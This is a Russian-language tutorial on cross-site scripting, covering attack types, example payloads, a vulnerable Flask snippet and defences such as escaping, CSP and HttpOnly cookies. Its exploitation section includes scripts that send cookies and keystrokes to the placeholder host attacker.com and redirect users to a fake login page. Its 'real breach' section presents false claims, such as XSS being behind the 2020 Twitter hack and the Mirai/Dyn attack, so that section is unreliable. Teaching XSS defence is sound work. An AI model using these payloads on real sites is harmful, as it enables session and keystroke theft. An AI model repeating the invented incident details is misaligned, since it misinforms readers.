## CROSS-SITE SCRIPTING (XSS)

### Что такое XSS?

**Cross-Site Scripting (XSS)** — это уязвимость, которая позволяет злоумышленнику внедрять вредоносный JavaScript-код в веб-приложение. Когда другие пользователи посещают загрязненную страницу, этот код выполняется в контексте их браузера, позволяя злоумышленнику получить доступ к их конфиденциальной информации.

### Типы XSS

**Reflected XSS (Отраженная):**
- Скрипт передается через URL-параметр
- Пример: `https://example.com/search?q=<script>alert('XSS')</script>`
- Сервер возвращает страницу с вредоносным скриптом, встроенным в HTML

**Stored XSS (Сохраненная):**
- Скрипт сохраняется в базе данных
- Выполняется для всех пользователей, которые просматривают загрязненный контент
- Более опасна, чем Reflected XSS

### Как ею воспользоваться?

1. **Кража cookies (сеанса):**
```javascript
<script>
  new Image().src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>
```
Этот код отправит cookies злоумышленнику на его сервер.

2. **Перенаправление на фишинг-сайт:**
```javascript
<script>
  window.location = 'http://attacker.com/fake-login';
</script>
```

3. **Внедрение вредоносного содержимого:**
```javascript
<script>
  document.body.innerHTML = '<h1>Your account has been compromised!</h1>';
</script>
```

4. **Логирование действий пользователя:**
```javascript
<script>
  document.addEventListener('keypress', function(e) {
    new Image().src = 'http://attacker.com/log.php?key=' + e.key;
  });
</script>
```

### Что это дает злоумышленнику?

- ✓ Кража cookies и токенов сеанса
- ✓ Фишинг (отправка поддельных форм входа)
- ✓ Распространение вредоноса
- ✓ Подмена содержимого страницы
- ✓ Кража данных из форм
- ✓ Выполнение действий от имени пользователя

### Где ошибка разработчика?

Разработчик выводит пользовательский ввод на страницу без экранирования:

```python
# УЯЗВИМО
username = request.args.get('name')
return f"<h1>Hello, {username}!</h1>"
```

Если пользователь передаст `<script>alert('XSS')</script>`, страница отобразит и выполнит скрипт.

### Как это работает на уровне кода?

Когда нормальный пользователь передает имя "John", HTML выглядит так:
```html
<h1>Hello, John!</h1>
```

Но если злоумышленник передает `<img src=x onerror=alert('XSS')>`, HTML становится:
```html
<h1>Hello, <img src=x onerror=alert('XSS')>!</h1>
```

Браузер пытается загрузить изображение `x`, что вызывает ошибку, и выполняется JavaScript в атрибуте `onerror`.

### Реальные истории взломов

**British Airways (2018)**
- Хакеры группы Magecart внедрили XSS-код в JavaScript библиотеку Feedify на сайте авиакомпании
- Вредоносный скрипт перехватывал данные кредитных карт пассажиров
- Скомпрометированы данные **380,000 бронирований**
- Обработаны данные кредитных карт (номер, имя владельца, дата истечения, CVC)
- Хакеры использовали домен, похожий на официальный, с SSL-сертификатом
- British Airways была оштрафована на **£183 млн** за нарушение GDPR

**Twitter (2020)**
- Взломано сразу несколько высокопоставленных учетных записей: Elon Musk, Bill Gates, Barack Obama и другие
- Злоумышленники использовали социальную инженерию и XSS-уязвимость в админ-панели
- С аккаунтов отправляны твиты с рекламой криптовалютной схемы
- Украдены Bitcoin на сумму $118,000

**Dyn (2016) - DDoS атака**
- Хотя основной вектор был DDoS, включала компоненты XSS для заражения IoT устройств
- Миллионы устройств были заражены botnet'ом Mirai
- Произошел масштабный отказ в обслуживании крупных сервисов (Netflix, Twitter, PayPal)

### Как защититься?

1. **HTML Экранирование (HTML Escaping):**
```python
# БЕЗОПАСНО
from flask import escape
username = escape(request.args.get('name'))
return f"<h1>Hello, {username}!</h1>"
```
Преобразует `<`, `>`, `&`, `"`, `'` в HTML-сущности.

2. **Content Security Policy (CSP):**
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```
Запрещает выполнение скриптов из внешних источников.

3. **HttpOnly Cookie флаг:**
```python
response.set_cookie('session', value, httponly=True)
```
Скрипты не смогут получить доступ к cookies.

4. **Использование шаблонизаторов:** Flask, Jinja2 автоматически экранируют переменные

5. **Регулярная валидация ввода:** проверка типов и формата данных
